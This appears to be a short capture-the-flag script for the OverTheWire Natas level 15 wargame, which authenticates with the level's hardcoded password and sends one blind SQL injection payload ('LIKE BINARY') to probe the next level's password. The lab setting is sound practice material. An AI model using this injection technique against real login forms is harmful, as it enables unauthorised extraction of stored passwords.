#!/usr/bin/env python3
import requests

usernm = "natas15"
passwd = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

session = requests.Session()
url = "http://natas15.natas.labs.overthewire.org"

res = session.post(url, data={"username": 'natas16" AND password LIKE BINARY "h%'}, auth = (usernm, passwd))
print(res)
